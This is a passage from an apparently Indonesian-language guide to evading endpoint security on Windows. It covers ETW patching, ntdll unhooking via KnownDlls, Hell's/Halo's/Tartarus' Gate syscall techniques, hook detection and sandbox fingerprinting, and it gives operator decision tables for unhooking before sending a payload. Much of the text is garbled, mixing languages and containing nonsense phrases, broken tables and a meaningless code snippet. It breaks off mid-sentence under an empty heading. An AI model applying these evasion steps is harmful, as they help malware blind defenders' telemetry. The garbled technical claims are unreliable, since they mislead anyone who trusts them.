## 8.4 ETW Patching — sub bagian lanjutan

### 8.4.1 `EtwEventWrite` patch vs kernel-internal tamper

- prologue-patch pada `ntdll!EtwEventWrite` men-disable *user mode* event untuk sumber ETW-nyaCLR security provider. Namun EDR dengan kerangka kernel callback (`PsSetCreateProcessNotifyRoutineEx`) + `ObRegisterCallbacks` diangkat — input via kernel tidak dapat dimatikan user mode. Keyword untuk host: Microsoft Defender toggles `NotSoEtw` (kernel callback via minifilter lebih tertanam).
- variant `TraceSetInformation` men-secara mem-*deregister* provider tapi tidak menutup session terkait; interplay: jika provider define manifest, menghapus dengan  `EventUnregister` (perbincangan) menghasilkan `0x8007139F` error, memberikan signal `disabling security telemetry`.

### 8.4.2 U-fork ETW "mixed" untuk setting defensive instrumentationについて

Uplift hunting: hubungkan `ETW TI (Threat Intelligence)` provider `Microsoft-Windows-Threat-Intelligence` dan perbandingannya *kegagalan register* dengan *normalization* untuk per-per-proses ID; compare ke *supported sandbox VM behavior* (Section 8.8). ETW Substitute event stream adds trackag for `Microsoft-Windows-PowerShell` ids `4103` (module logging) atau `4104` (transcription bypass hint, jika `AmsiScanContent` posted).

| Pattern anomaly (hunt) | Arti |
|---|---|
| Non-coverage gap pada `Kernel-File` provider sendiri | process install patch runtime — perlu diinvestigasi dump |
| Participant `EtwNotificationRegister` freq tinggi dalam check run | sweep scan att |
| ETW event `ProviderEnableCallback` freeing | acara rerouting provider ETW gung-ho |

### 8.4.3 Varian .NET — `EventPipe` di Windows-only

Kegagalan patch `EtwEventWrite` untuk menyembunyikan uploading data: `AppContext` setwell runtime venv. Bila Anda menonaktifkan `EventPipe` via *reverse traffic* — fallback: process protection harus menyatakan mempertahankan status pending opaque pada *broken timeline*; sequencing gap — memberi usulan to rerun dengan sandbox, ini adalah counter-insight: sebelum pilihall `EtwEventWrite` patch, cek apakah `Microsoft-Antimalware-AMSI` session juga ditempatkan; jika ya, lakukan pula pooling *EventPipe ID*, sesuai dengan interplay pada `System.Diagnostics.Tracing.EventSource` — dilihat dari hunter: writing-**EventName** field out-of-order adalah anomali.

---

## 8.5 ntdll Unhooking — Varian & Edge Case

### 8.5.1 Fresh-copy copy vs \\KnownDlls

Salinan `ntdll` dari `\??\C:\Windows\System32\ntdll.dll` *dan* dari `\KnownDlls\ntdll.dll` (section object directory). Section mapping through `\Device\HarddiskVolumeShadowCopy..` menghindari minifilter tetapi untuk perbincangan riskcontrol — `NtOpenSection(\KnownDlls\ntdll.dll)` thread gave mapped `IMAGE_BASE`-ning line jarang disarankan — periksa warisan sd-nya. Bila sandbox live-diff mode (point diff `map` hits proyeksi ssd) → pengetahuan forensik: pengukuran snapshot "hot bytes changed" sanggup di-kekang (stated at 8.7).

```c
// outline: mapping clean copy via section
// NtOpenSection(\KnownDlls\ntdll.dll, SECTION_MAP_READ)
// NtMapViewOfSection → fresh base
// Compare function bytes → restore modified region via VirtualProtect + memcpy
```

### 8.5.2 Hell's Gate / Halo's Gate / Tartarus & varian turunannya

| Varian | Asumsi | Risiko false-negative |
|---|---|---|
| Hell's Gate | syscall no. diolvers dari *starter mov eax, ss*. Hanya berlaku bilan *ntdll belum di-hook* — berlaku pertahankan target (legacy: hanya sinonim *restore* to vanilla) | menganggap hook pertama SSN selalu *mov eax, imm* |
| Halo's Gate | bilang *op-code* di–*hook* `(jmp ...)` merrawit 32 bytes. mencapai *adjacent function name (SSN = neighbors ± 1)* | function name sangat jauh |
| Tartarus' Gate | mix of Halo", fallback identik ke api-hashing menggunakan unhooked metadata | metadata tidak sinkron |
| SysWhispers3 | *static offset tabel*. Jatuh pada kernel *per build* (RS5 vs Win11 menerapkan hal sama berbeda), maklum per build | SSN mismatch besar diknowledged Win11 22H2+ (*per-architecture*) |
| HellsHalos + indirect syscall | syscall *instructed* at jmp `ntdll!KiSystemService` — menjaga *stack return address* menunjuk ntdll. Threat detection untuk direct syscall menghindari. | implementation complexity |

Edge case: *Syscall Numbering tampil sebagai `syscall; ret`* — Win11 24H2 redirect memanggil *syscall inst* may produce ke suatu "SSN mismatch set": measured validates - hunt for *`scancode` `mov eax, imm` berikut ret `c3`* not.

---

## 8.6 EDR Userland Hook Detection

**Bersifat roda dua.** → gunakan hanya untuk deteksi (host-based) atau (menghindari) *reversing protection against its own lab VM*. Direct techniques seperti berikut:
- dapatkan *function headers* di dalam stocked image. jika *bytes match* hook signature (`jmp qword ptr [rip+...]`, `push rax; ret`) adalah hook.
- Pattern scan module list for `C:\Windows\System32\<dll>.dll` *memory mismatch* dengan filesystem copy. table callback to report which dll is patched.

| Hook artifact | Umum di |
|---|---|
| 5-byte `e9 xx xx xx xx` hotpatch | older CrowdStroke |
| 12-14byte efficient jump set | newer S1, CS |
| inline hardware breakpoint w/ callback register | rare, ring-3 (tanpa threadcontext library calls), counter-detection sees `GetThreadContext` — highlight *safe location* |

```powershell
# contoh (deteksi): komparasi .text di memori vs disk (instrumentasi defensif)
$disk  = [IO.File]::ReadAllBytes("$env:SystemRoot\System32\ntdll.dll")
[Text.Encoding]::ASCII.GetString($disk) -match 'Jabcdefghijklmnop'
$proc = Get-Process -Id $PID; # compare IAT? bytes: use ReadProcessMemory externally.
```

Jebakan operasional: whitelist-signed .text ultra full compare `OriginalFirstThunk` revival technique implemented in ` KnownDlls` metadata → accidental (too slow across 12MB)}. Note: sandbox diffing re-check perbin list — a XOR scan per export is target; use hash (BLAKE3, per-section) not `Get-FileHash.`

### 8.6.1 Process-level "unwatchable" detection

- SetThreadContext-based hardware breakpoints visible to process analytics: `HiddenBreakpointDetect` uses `GetThreadContext` `ContextRecord->Dr0..3` — *any non-zero value within zeroed TLB switch indicates diagnostic hook kehendak product*. Tetapi kerap false positive to deb lockdown events — gagalkan pending detach.

---

## 8.7 Sandbox & Evasive Sleep —分化 & edge case (new taxonomy)

| Teknik | Definisi ulang vs versi proyek sebelumnya | Detection counter (advanced) |
|---|---|---|
| Sleep-skipping (fibers) | timer hiding via `NtSetTimerResolution` change per timing payload | EDR `SleepCycleTime` delta diJFR telemetri |
| sleep-in-timerbroker (etw farm) | host-clock skew easy detect multiple (rarely), sandbox in qgx passthru | executionImageANEW |
| `NtDelayExecution` writethrough | floating | inverted |
| Kerberos-sleep (wake token) | Probably only defensive issue | highlighted elsewhere |

Pembahasan: **wake-up detection on hyper call**: `SleepEx` on VM-to-host is *zero cognition*-level: initial jitter is `zzz привы furnatures`-style — seharusnya not — however "raw timer" defends: uses `rdtsc` with alucard response.

### 8.8 Hardware fingerprint & known-sandbox heuristic — *spesifier pick list*

- check `HKLM\HARDWARE\DESCRIPTION\System\BIOS`: keywords `VirtualBox`, `VMware`, `Xen`, `KVM`, `Hyper-V` minimal satu string maseh `SystemManufacturer`; bukan kunci `qemu`.
- check `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authorization` store val `flight` sign-sisantik contessor.
- kernel-module scan (`NtQuerySystemInformation SystemModuleInformation`) untuk `vboxdrv.sys`, `vmmr0nest`, `vmci.sys`, `vmnet*`. Hyper-V hypercall detection: `CPUID leaf 0x40000000` signature hypervisor bit — tapi jangan auto-block: **guardrailing false positive** bila target perusahaan sering menggunakan pembatasan *email VM*. Kombinasikan tiga atau lebih indikator, jangan trigger tunggal.

### 8.8.1 Counter-sandbox berbasis "1 hari observasi" (posture-grade)

Lakukan *desk check* — perwujudan tabel *policy-per-product* (quantitative sandbox):

| Sandbox trend | User tipikal | Interaksi kurva |
|---|---|---|
| Sandbox email-header | 0 user delay | Dwell trik: tidak ada ketikan > 15 menit (sleep acceleration) |
| Detonation tier (produksi grade) | melakuk randomern | runtime asal; mouse hooks gabungan dengan checked tile rata — singkatnya: | 

**Backstop — tabel quick decision**:

| Keadaan | Keputusan |
|---|---|
| Hook detected on `kernel32!VirtualAlloc` pre-call only | rebut unhook atau riset syscall direct approach |
| Hook *shellcode-style pattern overlaying* small syscall *gate* (direct ss4) | nothing to do — pertimbangkan *indirect* (syscall technique) |
| Firmware upload HF tech Backed | live defender — tidak -block: kecil gelembung family cloud feed upload |

## 8.9 Catatan operasional akhir

1. **Per-version bytes**: sebelum mengirim payload, gunakan `GetVersion` dan cek build — hot-patch offset-based schéme rentan *break* pada patch Selasa; gunakan *ID-based* lookup entrypoint (`GetProcAddress` + metapattern match).
2. **Parallelism**: hindari saoc

---

## [reasoning trace]


